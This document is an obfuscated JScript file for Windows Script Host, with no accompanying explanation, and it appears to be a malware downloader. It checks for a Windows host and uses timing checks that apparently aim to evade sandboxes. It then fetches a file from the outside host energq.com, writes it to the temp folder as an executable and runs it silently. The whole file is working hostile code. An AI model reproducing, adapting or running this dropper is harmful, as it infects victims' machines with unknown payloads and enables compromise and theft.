var K0 = false;
var Rh = "CreateObject";
var t = function gy() {return WScript[Rh]("WScript.Shell");}(), fa = 11;
var w = "MSXML2.XMLHTTP";
var g = 2123213;
var Ep = 0;
function vB(i){t["Run"](i, Ep, Ep);};
function Y(){return "" + w;};
function x(b, w0){Ep = Ep * 1; return b - w0;};
function u(){return Rh;};
/*@cc_on
  @if (@_win32 || @_win64)
    K0 = true;
  @end
@*/
if (K0)
{
var k = "";
function B(){return 22;};
var f = 0; var gN = 0;
function N()
{
var qb = new this["Date"]();
var CK = qb["getUTCMilliseconds"]();
WScript["Sleep"](B());
var qb = new this["Date"]();
var xk = qb["getUTCMilliseconds"]();
WScript["Sleep"](B());
var qb = new this["Date"]();
var K = qb["getUTCMilliseconds"]();
var f = "u0";
f = x(xk, CK);
var gN = "Dk";
gN = x(K, xk);
k = "open";
return x(f, gN);
}
var il = false;
var N0 = false;
for (var Ft = Ep; Ft < B() * 1; Ft++){if (N() != Ep){
il = true; 
gN = "31" + 11 * f + gN; 
N0 = true; 
break;
}}
function Z() {return ((il == true) && (il == N0)) ? 1 : Ep;};
if (il && Z() && N0){
function HB() {return t["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "mam6hXc3tP.exe";};
 l = Y();
 Pg = WScript[Rh](l);
 var DF = 1;
 while (DF){
try {
Pg[k]("GET", "http://energq.com/e3ola", false);
Pg["send"]();
jA = "Sleep";
for (;;){WScript[jA](B() * 11); if (Pg["readystate"] >= 2 * 2) break;};
DF = Ep;
} catch(r){};
}
function gj(Y0) {var Jz = (1, 2, 3, 4, 5, Y0); return Jz;};
z = WScript[u()]("ADODB.Stream");
l = z;
l[k]();
l["type"] = gj(1);
l["write"](Pg["ResponseBody"]);
z["position"] = gj(Ep);
l["Save" + "ToFile"](HB(), 2);
z["c"+"lose"]();
G = HB();
vB(G);
}
}

